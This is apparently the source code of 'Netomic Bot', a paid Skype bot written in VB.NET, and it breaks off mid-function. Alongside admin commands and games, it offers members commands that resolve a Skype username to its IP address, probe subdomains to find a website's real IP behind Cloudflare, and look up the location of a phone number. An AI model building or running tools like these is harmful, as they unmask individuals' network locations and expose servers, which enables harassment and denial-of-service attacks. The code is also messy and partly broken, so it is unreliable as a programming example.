'[!] Importing Skype Api
Imports SKYPE4COMLib '//To Access Skype Information
Imports System.Net
Imports System.IO
Imports System.Text.RegularExpressions

Public Class Main
#Region "Phone Lookup"
#Region "Delegates & Thread"
    Dim HookL As New UpdateLabel(AddressOf UL)
    Delegate Sub UpdateLabel(ByVal Label As Label, ByVal Text As String)

    Sub UL(ByVal Label As Label, ByVal Text As String)
        If Me.InvokeRequired Then
            Invoke(New UpdateLabel(AddressOf UL), Label, Text)
        Else
            Label.Text = Text
        End If
    End Sub

#End Region

    Private Function GetBetween(ByVal Input As String, ByVal STR1 As String, ByVal STR2 As String, ByVal Index As Integer) As String
        Return Regex.Split(Regex.Split(Input, STR1)(Index + 1), STR2)(0)
    End Function

    Sub GetProviderInfo()

    End Sub



#End Region

    '[*]DEFINE SElINDEX //Integer that Navigates threw tabs
    Dim Selindex As Integer = 0
    '[*]DEFINE OSKYPE //a Skype set a api
    Dim WithEvents nSkype As New Skype
    '[*]DEFINE TRIG //Triggers the Message as a command
    Dim wb0 As New WebClient
    Dim thread1 As System.Threading.Thread
    Dim exam0 As String
    Dim once As Boolean = False
    Dim i2 As String
    Dim TRIG As String = "."
    Dim p1 As String
    Dim p2 As String
    Dim p3 As String
    Dim p4 As String
    Dim p5 As String
    Dim Host As String
    Dim Port As String
    Dim Time As Integer
    Dim Method As Integer
    Dim LastAnswer As String
    Dim Color As String = "#7fba00"
    Private RandGen As Random 'Random Number Generator
    Dim rnd As New Random
    Private RandIndex As Integer
    Private arrAnswers(6) As String 'Our pics
    Dim PBTemp() As PictureBox 'Dynamic PictureBox
    '[!]NEXT BUTTON //Navigation threw Tabpages
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try '[T1]
            '[?]If not Selindex AKA the Selected Page doesn't go over the Number of Tabs there are!
            If Not Selindex = 3 Then '[1]
                '[?]Change The SelIndex so we can set it to the next Tabpage
                Selindex += 1
                '[?]Set The Tabpage to the Selindex number = The Next Tabpage 
                PlainTabControl1.SelectedIndex = Selindex
                '[?]Set the DTNlbl.value2 to the Tabpage text or the name or the page
                DisplayTabNamelbl.Value2 = PlainTabControl1.SelectedTab.Text
            End If '[1]
        Catch ex As Exception '[T1]
            '[?]if Something goes Wrongs
        End Try '[T1]
    End Sub
    '[!]BACK BUTTON //Navigation threw Tabpages
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try '[T1]
            '[?]Change The SelIndex so we can set it to the back to the last Tabpage
            If Not Selindex = 0 Then
                Selindex -= 1
                '[?]Change The SelIndex so we can set it to the last Tabpage
                PlainTabControl1.SelectedIndex = Selindex
                '[?]Set the DTNlbl.value2 to the Tabpage text or the name or the page
                DisplayTabNamelbl.Value2 = PlainTabControl1.SelectedTab.Text
            End If
        Catch ex As Exception '[T1]
            '[?]if it doesn't have a another Tabpage back add the selindex back 
            Selindex += 1
        End Try '[T1]
    End Sub
    '[!]ADD USER BUTTON //Add users to the listview of users for certain commands access
    Private Sub AddUser_button_Click(sender As Object, e As EventArgs) Handles AddUser_button.Click
        '[?]Adds Users to Listview of Users With the Username and then the splitter and then the Type of user
        Users_listview.AddItem(User_textbox.Text & "[]" & Type_combobox.SelectedItem)
    End Sub
    '[!]REMOVE USER BUTTON //Removes users to the listview of users for certain commands access
    Private Sub RemoveUser_button_Click(sender As Object, e As EventArgs) Handles RemoveUser_button.Click
        '[?]Removes Users to Listview of Users With the Selected item Selected
        Try '[T1]
            Users_listview.RemoveItem(Users_listview.SelectedItems(0))
            Users_richtextbox.Text = Users_richtextbox.Text.Replace(Users_listview.SelectedItems(0).Text, "")
        Catch ex As Exception '[T1]
            '[?]if it doesn't work msgbox Shows
            MsgBox("Please Select an item first before trying to remove an item!", MsgBoxStyle.Exclamation, "Try Again!")
        End Try '[T1]
    End Sub
    '[!]CHANGE USER BUTTON //Change users to the listview of users for certain commands access
    Private Sub ChangeType_button_Click(sender As Object, e As EventArgs) Handles ChangeType_button.Click
        '[?]Change Users to Listview of Users With the Selected item Selected
        Try '[T1]
            Users_listview.SelectedItems(0).Text = User_textbox.Text & "[]" & Type_combobox.SelectedItem
        Catch ex As Exception '[T1]
            '[?]if it doesn't work msgbox Shows
            MsgBox("Please Select an item first before trying to edit an item!", MsgBoxStyle.Exclamation, "Try Again!")
        End Try '[T1]
    End Sub
    Public Shared Function GetPingMs(ByRef hostNameOrAddress As String)
        Dim ping As New System.Net.NetworkInformation.Ping
        Return ping.Send(hostNameOrAddress).RoundtripTime
    End Function
    '[!]SKYPE GET MESSAGE & USER MESSAGE & BOT //The Control panel / bot Code for the bot
    Private Sub nSkype_MessageStatus(pMessage As ChatMessage, Status As TChatMessageStatus) Handles nSkype.MessageStatus
        '[?]Is checking if it is coming in and not out
        If Status = TChatMessageStatus.cmsReceived Or Status = TChatMessageStatus.cmsSent Then '[1]
            '[*]MSG BODY //Gets the Message
            Dim Msg As String = pMessage.Body
            '[*]CHAT FROM//Gets the Chat
            Dim c As Chat = pMessage.Chat
            '[?] if Msg starts with trigger "."

            If Msg.StartsWith("Finding") Then

                WebRequest.Create("" + Msg.Split(" ").Last)
                exam0 = wb0.DownloadString("" + Msg.Split(" ").Last)
                If Not exam0.Contains("Error") Then
                    pMessage.Body = "Your IP Address is " + exam0
                End If
            End If

            If Msg.StartsWith("Resolving ") Then

                Try
                    WebRequest.Create("" + Msg.Split(" ").Last)
                    exam0 = wb0.DownloadString("" + Msg.Split(" ").Last)
                    If exam0.Contains("Error") Then
                        pMessage.Body = "Resolving."
                        WebRequest.Create("" + Msg.Split(" ").Last)
                        exam0 = wb0.DownloadString("" + Msg.Split(" ").Last)
                        If exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                            pMessage.Body = "Resolving.."
                            WebRequest.Create("" + Msg.Split(" ").Last)
                            exam0 = wb0.DownloadString("" + Msg.Split(" ").Last)
                            If exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                                pMessage.Body = "Resolving..."
                                WebRequest.Create("" + Msg.Split(" ").Last)
                                exam0 = wb0.DownloadString("" + Msg.Split(" ").Last)
                                If exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                                    pMessage.Body = "Resolving."
                                    WebRequest.Create("" + Msg.Split(" ").Last)
                                    exam0 = wb0.DownloadString("" + Msg.Split(" ").Last)
                                    If exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                                        pMessage.Body = "Resolving.."
                                        WebRequest.Create("" + Msg.Split(" ").Last)
                                        exam0 = wb0.DownloadString("" + Msg.Split(" ").Last)
                                        If exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                                            pMessage.Body = "Resolving..."
                                            WebRequest.Create("" + Msg.Split(" ").Last)
                                            exam0 = wb0.DownloadString("" + Msg.Split(" ").Last)
                                            If exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                                                pMessage.Body = "Try again later!"

                                            End If
                                            If Not exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                                                pMessage.Body = "IP Address for " + Msg.Split(" ").Last + " is " + exam0
                                            End If
                                        End If
                                        If Not exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                                            pMessage.Body = "IP Address for " + Msg.Split(" ").Last + " is " + exam0
                                        End If
                                    End If
                                    If Not exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                                        pMessage.Body = "IP Address for " + Msg.Split(" ").Last + " is " + exam0
                                    End If
                                End If
                                If Not exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                                    pMessage.Body = "IP Address for " + Msg.Split(" ").Last + " is " + exam0
                                End If
                            End If
                            If Not exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                                pMessage.Body = "IP Address for " + Msg.Split(" ").Last + " is " + exam0
                            End If
                        End If
                        If Not exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                            pMessage.Body = "IP Address for " + Msg.Split(" ").Last + " is " + exam0
                        End If
                    End If
                    If Not exam0.Contains("Error") Or exam0.Contains("Account blacklisted") Or exam0.Contains("found") Then
                        pMessage.Body = "IP Address for " + Msg.Split(" ").Last + " is " + exam0
                    End If
                Catch ex As Exception
                    pMessage.Body = "Error resolving username:=" + Msg.Split(" ").Last & "!"
                End Try
            End If
            If Msg.StartsWith(TRIG) Then '[2]

                '[?] Remove the dot in front of the command so we can read it!
                Msg = Msg.Remove(0, 1).ToLower
                '[?] Commands = "whatever" then continue to do what ever
                If Msg = "unregister" Then '[3]
                    For Each item As NSListView.NSListViewItem In Users_listview.Items
                        Dim username As String = item.Text.Split("[]").First
                        If username = pMessage.Sender.Handle Then
                            Users_listview.RemoveItem(item)
                            c.SendMessage("You have been removed from the database!")

                        End If
                    Next
                    '[?] Sending the message to Chat (sendmessage sends the message)
                ElseIf Msg = "register" Then '[3]
                    If Users_richtextbox.Text.Contains(pMessage.Sender.Handle) Then
                        c.SendMessage("You are already registered in our system!")
                    Else
                      
                                    Dim buypp As String = wb0.DownloadString("http://tinyurl.com/api-create.php?url=" & "https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&business=Scarr14%40outlook%2ecom&lc=US&item_name=Netomic%20Bot%20Membership%20Registration&item_number=" & pMessage.Sender.Handle & "&amount=1%2e00&currency_code=USD&button_subtype=services&bn=PP%2dBuyNowBF%3abtn_buynowCC_LG%2egif%3aNonHosted")
                                    c.SendMessage("==============================" + vbNewLine + "       [===-Netomic Bot Membership-===]     " + vbNewLine + "==============================" + vbNewLine + " " + vbNewLine + "Registration price: $1.00 USD" + vbNewLine + "Duration: Lifetime" + vbNewLine + "Your personal payment link is: " + buypp)
                             
                    End If
                End If '[3]
            ElseIf Msg = "help" Then
                c.SendMessage("To start using the commands type .register to register, after you have registered type .menu view a list of  commands.")
            End If '[2]
            If Msg = "admin.menu" Then
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            c.SendMessage("==============================" + vbNewLine + "       [===-Netomic Admin Commands-===]     " + vbNewLine + "==============================" + vbNewLine + "When using commmands do not include the '< >'" + vbNewLine + " " + vbNewLine + "[.] ban <Skype Username> - Ban user from further access of Netomic Bot." + vbNewLine + "[.] register <Skype Username> - Register user to access Netomic Bot." + vbNewLine + "[.] upgradeuser <Skype Username> - Upgrades user's account to a premium account." + vbNewLine + "[.] logs - View the logs of recent commands from users." + vbNewLine + "[.] client status <Mode> - Set client status." + vbNewLine + "[.] display status <Mode> - Set display status." + vbNewLine + "[.] fmlrefresh - Refesh list of FML storyies." + vbNewLine + "[.] saveusers - Save current database of usernames." + vbNewLine + "[.] set trigger= <Trigger> - Set trigger for commands." + vbNewLine + "[.] auto-accept contacts= contacts= <On/Off> - Toggle auto-accept contacts." + vbNewLine + "[.] auto-reject calls= <On/Off> - Toggle auto-reject calls." + vbNewLine + "[.] humanmode <On/Off> - Toggle human mode.")
                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next

            ElseIf Msg.StartsWith("ban") Then
                Dim user As String() = Msg.Split(" ")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            For Each item8 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                                Dim username8 As String = item8.Text.Split("[]").First
                                If username8 = user(1) Then
                                    Users_listview.RemoveItem(item8)
                                    Users_richtextbox.Text = Users_richtextbox.Text.Replace(user(1), "")
                                    Users_listview.AddItem(user(1) & "[]" & "Banned")
                                    Users_richtextbox.Text += user(1) & "[]" & "Banned"
                                    c.SendMessage(user(1) + " is now banned!")
                                End If
                            Next

                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("unban") Then
                Dim user As String() = Msg.Split(" ")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            For Each item8 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                                Dim username8 As String = item8.Text.Split("[]").First
                                If username8 = user(1) Then
                                    Users_listview.RemoveItem(item8)
                                    Users_richtextbox.Text = Users_richtextbox.Text.Replace(user(1), "")
                                    Users_listview.AddItem(user(1) & "[]" & "Registered")
                                    Users_richtextbox.Text += user(1) & "[]" & "Registered"
                                    c.SendMessage(user(1) + " is now unbanned!")
                                End If
                            Next

                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("upgradeuser") Then
                Dim user As String() = Msg.Split(" ")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            For Each item8 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                                Dim username8 As String = item8.Text.Split("[]").First
                                If username8 = user(1) Then
                                    Users_listview.RemoveItem(item8)
                                    Users_richtextbox.Text = Users_richtextbox.Text.Replace(user(1), "")
                                    Users_listview.AddItem(user(1) & "[]" & "Premuim")
                                    Users_richtextbox.Text += user(1) & "[]" & "Premuim"
                                    c.SendMessage(user(1) + " is now Premuim!")
                                End If
                            Next

                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            ElseIf Msg = "logs" Then

                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            c.SendMessage("==============================" + vbNewLine + "          [===-Netomic Bot Command Logs-===]     " + vbNewLine + "==============================")
                            For Each item As NSListView.NSListViewItem In NsListView1.Items
                                c.SendMessage(item.Text)
                            Next
                            c.SendMessage("===========================================")
                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("auto-reject calls=") Then
                Dim user As String() = Msg.Split("=")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            If user(1) = "On" Then
                                ARC_checkbox.Checked = True
                            Else
                                ARC_checkbox.Checked = False
                            End If
                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("auto-accept contacts=") Then
                Dim user As String() = Msg.Split("=")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            If user(1) = "On" Then
                                AAC_Checkbox.Checked = True
                            Else
                                AAC_Checkbox.Checked = False
                            End If
                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("display status=") Then
                Dim user As String() = Msg.Split("=")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            If user(1) = "Online" Then
                                ClientStatus_Combobox.SelectedItem = ClientStatus_Combobox.Items(0)

                                nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusOnline
                                nSkype.CurrentUserProfile.MoodText = "Status: Online  |  Type .register to active your account"

                            ElseIf user(1) = "Maintenance" Then

                                nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusAway
                                nSkype.CurrentUserProfile.MoodText = "Status: Maintenance  |  Netomic Bot is currently under maintenace"


                            ElseIf user(1) = "Offline" Then
                                nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusInvisible
                                nSkype.CurrentUserProfile.MoodText = "Status: Offline  |  Netomic Bot is currently offline"

                            End If
                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("set trigger=") Then
                Dim user As String() = Msg.Split("=")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            TRIG = user(1)
                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("saveusers") Then
                Dim user As String() = Msg.Split(" ")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            Button3.PerformClick()
                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("humanmode") Then
                Dim user As String() = Msg.Split(" ")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            If user(1) = "On" Then
                                HM_Checkbox.Checked = True
                            Else
                                HM_Checkbox.Checked = False
                            End If
                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("fmlrefresh") Then
                Dim user As String() = Msg.Split(" ")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            ListView5.Items.Clear()
                            ListView5.Items.Add("lawl")
                            Dim web As New System.Net.WebClient
                            RichTextBox1.Text = web.DownloadString("http://www.fmylife.com/")
                            '<div class="post article" id="21176835"><p><a href="/miscellaneous/21176835" class="fmllink">Today, I decided to tell my family, including my husband, that I'm pregnant.</a><a href="/miscellaneous/21176835" class="fmllink"> Their reaction was basically a "meh" before returning to watching the World Cup.</a><a href="/miscellaneous/21176835" class="fmllink"> FML</a></p><div class="date"><div class="left_part"><a href="/miscellaneous/21176835" id="article_21176835" name="/resume/article/21176835" class="jTip">#21176835</a><br><span class="dyn-comments">59 comments</span></div><div class="right_part"><p><span class="dyn-vote-j" id="vote21176835"><a href="javascript:;" onclick="vote('21176835','9933','agree');">I agree, your life sucks</a> (<span class="dyn-vote-j-data">9938</span>)</span> - <span class="dyn-vote-t" id="votebf21176835"><a href="javascript:;" onclick="vote('21176835','1843','deserve');" class="bf">you deserved it</a> (<span class="dyn-vote-t-data">1843</span>)</span></p><p>On 06/16/2014 at 2:50pm - <a class="liencat" href="/miscellaneous">misc</a> - by FMeeee (<a href="/gender/woman" class="light">woman</a>) - <a href="/country/Portugal" class="liencat">Portugal</a> (<a href="/region/Aveiro" class="light">Aveiro</a>)</p></div></div><div class="more" id="more21176835"><div class="fb-like fb_iframe_widget" data-href="http://www.fmylife.com/miscellaneous/21176835" data-send="false" data-width="100" data-height="21" data-layout="button_count" data-show-faces="false" data-font="lucida grande" fb-xfbml-state="rendered" fb-iframe-plugin-query="app_id=400710503290105&amp;font=lucida%20grande&amp;height=21&amp;href=http%3A%2F%2Fwww.fmylife.com%2Fmiscellaneous%2F21176835&amp;layout=button_count&amp;locale=en_US&amp;sdk=joey&amp;send=false&amp;show_faces=false&amp;width=100" style="display: block;"><span style="vertical-align: bottom; width: 78px; height: 20px;"><iframe name="f5b4465" width="100px" height="21px" frameborder="0" allowtransparency="true" scrolling="no" title="fb:like Facebook Social Plugin" src="http://www.facebook.com/plugins/like.php?app_id=400710503290105&amp;channel=http%3A%2F%2Fstatic.ak.facebook.com%2Fconnect%2Fxd_arbiter%2FV80PAcvrynR.js%3Fversion%3D41%23cb%3Df249fdc3cc%26domain%3Dwww.fmylife.com%26origin%3Dhttp%253A%252F%252Fwww.fmylife.com%252Ff3e9bf69cc%26relation%3Dparent.parent&amp;font=lucida%20grande&amp;height=21&amp;href=http%3A%2F%2Fwww.fmylife.com%2Fmiscellaneous%2F21176835&amp;layout=button_count&amp;locale=en_US&amp;sdk=joey&amp;send=false&amp;show_faces=false&amp;width=100" class="" style="border: none; visibility: visible; width: 78px; height: 20px;"></iframe></span></div><a href="javascript:;" onclick="return twitter_click('http://www.fmylife.com/miscellaneous/21176835#new','21176835');" class="tooltips t_twitter"></a></div>
                            Dim i As Integer = 1
                            Dim words2 As String() = RichTextBox1.Text.Split(New Char() {"<div class=" & Chr(34) & "post articl" & Chr(34) & "e"c, ControlChars.Lf, ControlChars.Cr, ControlChars.Tab})
                            For Each word As String In words2
                                If word.Contains("class=" & Chr(34) & "fmllink" & Chr(34)) Then
                                    'a href="/miscellaneous/21176835" class="fmllink">
                                    Dim id As String = word.Split("/miscellaneous/").Last
                                    Dim txt As String = id.Split(Chr(34) + "class=" + Chr(34) + "fmllink" + Chr(34) + ">").Last
                                    txt = txt.Replace(">", "")
                                    txt = txt.Replace("&quot;", Chr(34))
                                    id = id.Split(Chr(34) + "class=" + Chr(34) + "fmllink" + Chr(34) + ">").First
                                    If Not txt.Contains("FML") Then
                                        Try
                                            ListView5.Items(i).SubItems(1).Text += txt
                                        Catch ex As Exception
                                            Dim objitem As ListViewItem = ListView5.Items.Add(id)
                                            objitem.SubItems.Add(txt)
                                        End Try

                                    Else
                                        i += 1
                                    End If
                                    'RichTextBox2.Text += word + vbNewLine
                                End If
                            Next
                            c.SendMessage("FML storyies refreshed!")
                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            ElseIf Msg = "info" Then
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Admin" Then '[6]
                            i2 = 0
                            For Each friend1 As SKYPE4COMLib.User In nSkype.Friends
                                If friend1.OnlineStatus = SKYPE4COMLib.TOnlineStatus.olsOnline Then
                                    i2 += 1
                                End If
                                If friend1.OnlineStatus = SKYPE4COMLib.TOnlineStatus.olsDoNotDisturb Then
                                    i2 += 1
                                End If
                            Next
                            c.SendMessage("==============================" + vbNewLine + "          [===-Netomic Bot Information-===]     " + vbNewLine + "==============================" + vbNewLine + "Client status: " & ClientStatus_Combobox.SelectedItem + vbNewLine + "Display status: " & DisplayStatus_Combobox.SelectedItem + vbNewLine + "Users online: " & i2 + vbNewLine + "Save settings: " & NsCheckBox1.Checked.ToString + vbNewLine + "Require registartion: " & NsCheckBox2.Checked.ToString + vbNewLine + "Auto-Accpet Contacts: " & AAC_Checkbox.Checked.ToString + vbNewLine + "Auto-Reject Calls: " & ARC_checkbox.Checked.ToString)
                        Else
                            c.SendMessage("You are not an administrator!")
                        End If
                    End If
                Next
            End If
            If Msg = "dice" Then
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Premuim" Or Type2 = "Admin" Then '[6]
                            c.SendMessage("Pick a number 1 through 6")
                            ListView1.Items.Add(pMessage.Sender.Handle)
                        Else
                            c.SendMessage("Your account is not upgraded!")
                        End If
                    End If
                Next
            ElseIf Msg = "ttt" Then
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Premuim" Or Type2 = "Admin" Then '[6]
                            'For Each item3 As ListViewItem In ListView3.Items
                            ' If item3.Text = pMessage.Sender.Handle Then
                            ' c.SendMessage("You are already in a TTT game.")
                            ' Else
                            c.SendMessage("Bot = X, You = O" + vbNewLine + "a b c" + vbNewLine + " | |  1" + vbNewLine + "------" + vbNewLine + " | |  2" + vbNewLine + "------" + vbNewLine + " | |  3" + vbNewLine)
                            Dim objitem As ListViewItem = ListView3.Items.Add(pMessage.Sender.Handle)
                            objitem.SubItems.Add(" ")
                            objitem.SubItems.Add(" ")
                            objitem.SubItems.Add(" ")
                            objitem.SubItems.Add(" ")
                            objitem.SubItems.Add(" ")
                            objitem.SubItems.Add(" ")
                            objitem.SubItems.Add(" ")
                            objitem.SubItems.Add(" ")
                            objitem.SubItems.Add(" ")
                            '  End If
                            ' Next
                        Else
                            c.SendMessage("Your account is not upgraded!")
                        End If
                    End If
                Next
            ElseIf Msg = "jackpot" Then
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Premuim" Or Type2 = "Admin" Then '[6]
                            c.SendMessage("Pick a color, black or red.")
                            ListView1.Items.Add(pMessage.Sender.Handle)
                        Else
                            c.SendMessage("Your account is not upgraded!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("phonetogeo") Then
                Dim user As String() = Msg.Split(" ")

                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Premuim" Or Type2 = "Admin" Then '[6]

                            Dim Source As String = New WebClient().DownloadString("http://retrosleuth.com/free-phone-carrier-search?phone_number=" & user(1) & "#result")
                            Try
                                UL(Label2, GetBetween(Source, "Type: </h2>&nbsp;&nbsp;", "<br />", 0))
                                UL(Label3, GetBetween(Source, ">Location: </h2>&nbsp;&nbsp;", "		<input name=", 0))
                                UL(Label4, GetBetween(Source, "Carrier: </h2>&nbsp;&nbsp;", "<br />", 0))
                                c.SendMessage("Phone Type: " & Label2.Text)
                                c.SendMessage("Phone Location: " & Label3.Text)
                                c.SendMessage("Phone Provider: " & Label4.Text)
                            Catch ex As Exception
                                c.SendMessage("The phone number you provided is not a a USA mobile or home phone number")
                            End Try
                        Else
                            c.SendMessage("Your account is not upgraded!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("cfresolve") Then
                Dim user As String() = Msg.Split(" ")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        'If Type2 = "Premuim" Or Type2 = "Admin" Then '[6]
                        Dim Domains(9)
                        Domains(0) = "blog."
                        Domains(1) = "cpanel."
                        Domains(2) = "dev."
                        Domains(3) = "direct."
                        Domains(4) = "direct-connect."
                        Domains(5) = "ftp."
                        Domains(6) = "forum."
                        Domains(7) = "mail."
                        Domains(8) = "m."
                        Domains(9) = "webmail."
                        For Each Str As String In Domains
                            Try
                                Dim hostname As IPHostEntry = Dns.GetHostByName(Str + user(1))
                                Dim ip As IPAddress() = hostname.AddressList
                                c.SendMessage(Str + user(1) + ": " + ip(0).ToString())
                            Catch ex As Exception
                                c.SendMessage(Str + user(1) + ": Not Found")
                            End Try
                        Next
                        'Else
                        'c.SendMessage("Your account is not upgraded!")
                        'End If

                    End If
                Next
            ElseIf Msg.StartsWith("fml") Then
                Dim user As String() = Msg.Split(" ")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Premuim" Or Type2 = "Admin" Then '[6]
                            Try
                                Dim li As Integer = user(1)
                                c.SendMessage("FML: " & ListView5.Items(li).SubItems(1).Text)
                            Catch ex As Exception
